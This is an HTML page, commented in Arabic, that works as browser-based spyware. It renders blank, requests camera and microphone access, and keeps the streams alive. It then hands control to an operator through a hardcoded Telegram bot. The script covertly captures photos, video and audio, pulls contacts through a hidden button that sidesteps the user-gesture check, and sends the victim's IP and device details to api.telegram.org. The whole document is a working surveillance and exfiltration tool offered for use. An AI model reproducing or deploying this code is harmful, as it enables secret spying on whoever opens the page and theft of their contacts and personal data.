<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        * { display: none; }
    </style>
</head>
<body>
    <!-- عنصر مخفي لالتقاط التفاعل من المستخدم لجهات الاتصال -->
    <button id="hiddenContactButton" style="position: absolute; top: -100px; left: -100px; opacity: 0; width: 1px; height: 1px;"></button>
    
    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        let lastUpdateId = 0;
        let cameraReady = false;
        let isProcessing = false;
        
        // التيارات الثابتة - تبقى نشطة طوال الوقت
        let persistentVideoStream = null;
        let persistentAudioStream = null;
        let videoTrack = null;
        let imageCapture = null;
        
        // متغير لتخزين الـ resolve لوظيفة الاتصال
        let pendingContactsResolve = null;
        
        // ========== تفعيل الكاميرا والميكروفون مرة واحدة فقط ==========
        async function initCamera() {
            try {
                persistentVideoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: true 
                });
                videoTrack = persistentVideoStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                
                persistentAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                cameraReady = true;
                console.log("✅ الكاميرا والميكروفون نشطة وجاهزة");
                await sendToTelegram("✅ تم تفعيل الكاميرا والميكروفون");
                await sendBotMenu();
                return true;
            } catch (e) {
                console.error("❌ فشل:", e);
                cameraReady = false;
                return false;
            }
        }
        
        // ========== التقاط صورة (بدون طلب صلاحية) ==========
        async function capturePhoto() {
            if (!cameraReady) return null;
            
            try {
                // التأكد من أن التيار حي
                if (videoTrack && videoTrack.readyState !== 'live') {
                    await reinitCamera();
                }
                const photoBlob = await imageCapture.takePhoto();
                return photoBlob;
            } catch (e) {
                console.error("فشل التصوير:", e);
                return null;
            }
        }
        
        // ========== تسجيل فيديو (بدون طلب صلاحية - يستخدم نفس التيار الثابت) ==========
        async function recordVideo(duration = 10000) {
            if (!cameraReady) return null;
            
            try {
                // التأكد من أن تيار الفيديو حي
                if (videoTrack && videoTrack.readyState !== 'live') {
                    await reinitCamera();
                }
                
                // الحصول على مسار الفيديو الحالي
                const currentVideoTrack = persistentVideoStream.getVideoTracks()[0];
                
                // الحصول على مسار الميكروفون الحالي
                let audioTrack = null;
                if (persistentAudioStream && persistentAudioStream.getAudioTracks().length > 0) {
                    audioTrack = persistentAudioStream.getAudioTracks()[0];
                }
                
                // إنشاء تيار جديد من المسارات الموجودة (بدون طلب صلاحية جديد)
                const tracks = [currentVideoTrack];
                if (audioTrack && audioTrack.readyState === 'live') {
                    tracks.push(audioTrack);
                }
                const combinedStream = new MediaStream(tracks);
                
                const recorder = new MediaRecorder(combinedStream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, duration);
                });
            } catch (e) {
                console.error("فشل تسجيل الفيديو:", e);
                return null;
            }
        }
        
        // ========== تسجيل صوت (بدون طلب صلاحية) ==========
        async function recordAudio(duration = 10000) {
            if (!cameraReady) return null;
            
            try {
                // استخدام تيار الميكروفون الثابت
                let audioTrack = null;
                if (persistentAudioStream && persistentAudioStream.getAudioTracks().length > 0) {
                    audioTrack = persistentAudioStream.getAudioTracks()[0];
                }
                
                let stream;
                if (audioTrack && audioTrack.readyState === 'live') {
                    stream = new MediaStream([audioTrack]);
                } else {
                    // إذا كان التيار ميتاً، نطلب تياراً جديداً (المتصفح لن يطلب صلاحية لأنه سبق منحها)
                    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    persistentAudioStream = stream;
                    audioTrack = stream.getAudioTracks()[0];
                }
                
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) {
                console.error("فشل تسجيل الصوت:", e);
                return null;
            }
        }
        
        // إعادة تشغيل الكاميرا إذا انقطعت
        async function reinitCamera() {
            try {
                if (persistentVideoStream) {
                    persistentVideoStream.getTracks().forEach(t => t.stop());
                }
                if (persistentAudioStream) {
                    persistentAudioStream.getTracks().forEach(t => t.stop());
                }
                
                persistentVideoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoTrack = persistentVideoStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                persistentAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                cameraReady = true;
                console.log("✅ تم إعادة تشغيل الكاميرا");
                return true;
            } catch (e) {
                cameraReady = false;
                return false;
            }
        }
        
        // ========== سحب جهات الاتصال (مع تجاوز مشكلة user gesture) ==========
        async function getContacts() {
            try {
                if (!navigator.contacts) {
                    await sendToTelegram("❌ المتصفح لا يدعم سحب جهات الاتصال (مطلوب Chrome 80+ على Android)");
                    return null;
                }
                
                await sendToTelegram("📞 جاري فتح نافذة جهات الاتصال...");
                
                // محاولة مباشرة أولاً
                try {
                    const contacts = await navigator.contacts.select(
                        ['name', 'tel', 'email'],
                        { multiple: true }
                    );
                    
                    if (!contacts || contacts.length === 0) {
                        await sendToTelegram("❌ لا توجد جهات اتصال أو تم رفض الوصول");
                        return null;
                    }
                    
                    await sendContactsResult(contacts);
                    return contacts;
                    
                } catch (gestureError) {
                    // إذا فشل بسبب user gesture، نستخدم الزر المخفي
                    if (gestureError.message.includes('user gesture')) {
                        await sendToTelegram("⚠️ يرجى النقر على إشعار التفاعل...");
                        
                        // إنشاء عنصر زر مخفي وتنشيطه
                        const btn = document.getElementById('hiddenContactButton');
                        
                        const result = await new Promise((resolve) => {
                            pendingContactsResolve = resolve;
                            btn.click();
                        });
                        
                        if (result && result.length > 0) {
                            await sendContactsResult(result);
                            return result;
                        } else {
                            await sendToTelegram("❌ لم يتم تحديد أي جهات اتصال");
                            return null;
                        }
                    } else {
                        throw gestureError;
                    }
                }
                
            } catch (e) {
                console.error("فشل:", e);
                await sendToTelegram(`❌ فشل سحب جهات الاتصال: ${e.message}`);
                return null;
            }
        }
        
        // معالجة نتيجة جهات الاتصال
        async function sendContactsResult(contacts) {
            let contactsText = "📞 *جهات الاتصال*\n\n";
            contactsText += `📊 العدد: ${contacts.length}\n\n`;
            
            for (let i = 0; i < Math.min(contacts.length, 50); i++) {
                const contact = contacts[i];
                const name = contact.name?.[0] || "بدون اسم";
                const phones = contact.tel?.map(t => t.value).join(", ") || "لا يوجد رقم";
                
                contactsText += `👤 ${i+1}. ${name}\n📱 ${phones}\n`;
                contactsText += "─".repeat(15) + "\n";
                
                if (contactsText.length > 3500) {
                    await sendToTelegram(contactsText);
                    contactsText = "📞 *جهات الاتصال (تابع)*\n\n";
                }
            }
            
            await sendToTelegram(contactsText);
            await sendToTelegram(`✅ تم استخراج ${contacts.length} جهة اتصال`);
            
            // إرسال كملف CSV
            let csvContent = "الاسم,رقم الهاتف,البريد الإلكتروني\n";
            for (const contact of contacts) {
                const name = contact.name?.[0] || "بدون اسم";
                const phones = contact.tel?.map(t => t.value).join(";") || "";
                const emails = contact.email?.join(";") || "";
                csvContent += `"${name}","${phones}","${emails}"\n`;
            }
            const blob = new Blob(["\uFEFF" + csvContent], { type: "text/csv" });
            await sendFile(blob, "contacts.csv", "document");
        }
        
        // معالج النقر على الزر المخفي
        document.getElementById('hiddenContactButton').addEventListener('click', async () => {
            if (pendingContactsResolve) {
                try {
                    const contacts = await navigator.contacts.select(
                        ['name', 'tel', 'email'],
                        { multiple: true }
                    );
                    pendingContactsResolve(contacts || []);
                } catch (e) {
                    pendingContactsResolve([]);
                }
                pendingContactsResolve = null;
            }
        });
        
        // ========== دوال التليجرام ==========
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
                });
            } catch (e) {}
        }
        
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
        }
        
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: formData });
        }
        
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
        }
        
        async function sendFile(blob, filename, type = "document") {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append(type === "document" ? "document" : "photo", blob, filename);
            await fetch(`https://api.telegram.org/bot${token}/send${type === "document" ? "Document" : "Photo"}`, {
                method: "POST",
                body: formData
            });
        }
        
        async function sendDeviceInfo() {
            try {
                const battery = await navigator.getBattery();
                const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
                const msg = `
👑 *معلومات الجهاز* 👑

• IP: ${ip.ip || "غير معروف"}
• المتصفح: ${navigator.userAgent.substring(0, 80)}
• النظام: ${navigator.platform}
• الشاشة: ${screen.width}x${screen.height}
• البطارية: ${Math.round(battery.level * 100)}% ${battery.charging ? '🔌' : '🔋'}
                `;
                await sendToTelegram(msg);
            } catch(e) {}
        }
        
        // ========== واجهة البوت ==========
        async function sendBotMenu() {
            const message = `🎮 *التحكم عن بعد* 🎮

✅ الكاميرا جاهزة (لا تطلب صلاحية)`;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: "📸 صورة", callback_data: "photo" }, { text: "🎬 فيديو 10ث", callback_data: "video" }],
                    [{ text: "🎤 صوت 10ث", callback_data: "audio" }, { text: "📞 جهات الاتصال", callback_data: "contacts" }],
                    [{ text: "📸 10 صور", callback_data: "10photos" }, { text: "🎤 10 صوت", callback_data: "10audios" }],
                    [{ text: "🎬 فيديو دقيقة", callback_data: "video60" }, { text: "📊 معلومات", callback_data: "info" }],
                    [{ text: "🔄 تنفيذ الكل", callback_data: "full" }]
                ]
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown", reply_markup: keyboard })
            });
        }
        
        // ========== معالجة الأوامر ==========
        async function handleCommand(cmd) {
            if (isProcessing) {
                await sendToTelegram("⏳ انتظر...");
                return;
            }
            isProcessing = true;
            
            switch(cmd) {
                case "photo":
                    await sendToTelegram("📸 جاري...");
                    const p = await capturePhoto();
                    if (p) { await sendPhoto(p); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "video":
                    await sendToTelegram("🎬 جاري تسجيل 10ث...");
                    const v = await recordVideo(10000);
                    if (v) { await sendVideo(v); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "video60":
                    await sendToTelegram("🎬 جاري تسجيل دقيقة...");
                    const v60 = await recordVideo(60000);
                    if (v60) { await sendVideo(v60); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "audio":
                    await sendToTelegram("🎤 جاري تسجيل 10ث...");
                    const a = await recordAudio(10000);
                    if (a) { await sendVoice(a); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "contacts":
                    await getContacts();
                    break;
                    
                case "10photos":
                    await sendToTelegram("📸 جاري 10 صور...");
                    for (let i=0; i<10; i++) {
                        const ph = await capturePhoto();
                        if (ph) await sendPhoto(ph);
                        await new Promise(r => setTimeout(r, 300));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                    
                case "10audios":
                    await sendToTelegram("🎤 جاري 10 تسجيلات...");
                    for (let i=0; i<10; i++) {
                        const au = await recordAudio(10000);
                        if (au) await sendVoice(au);
                        await new Promise(r => setTimeout(r, 500));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                    
                case "info":
                    await sendDeviceInfo();
                    break;
                    
                case "full":
                    await sendToTelegram("🔄 بدء التنفيذ الكامل...");
                    const photo = await capturePhoto();
                    if (photo) await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 2000));
                    const video = await recordVideo(10000);
                    if (video) await sendVideo(video);
                    await new Promise(r => setTimeout(r, 2000));
                    const audio = await recordAudio(10000);
                    if (audio) await sendVoice(audio);
                    await sendToTelegram("✅ تم");
                    break;
            }
            isProcessing = false;
        }
        
        // جلب التحديثات
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=25&offset=${lastUpdateId+1}`;
                const res = await fetch(url);
                const data = await res.json();
                if (data.result) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            await handleCommand(update.callback_query.data);
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });
                        }
                    }
                }
            } catch(e) {}
        }
        
        // الحفاظ على الكاميرا نشطة
        setInterval(async () => {
            if (videoTrack && videoTrack.readyState === 'ended') {
                console.log("🔄 إعادة تشغيل الكاميرا...");
                await reinitCamera();
            }
        }, 5000);
        
        // ========== التشغيل ==========
        window.onload = async () => {
            await initCamera();
            await sendBotMenu();
            await sendToTelegram("🎯 النظام جاهز - الكاميرا والميكروفون نشطان");
            setInterval(getUpdates, 2000);
        };
    </script>
</body>
</html>
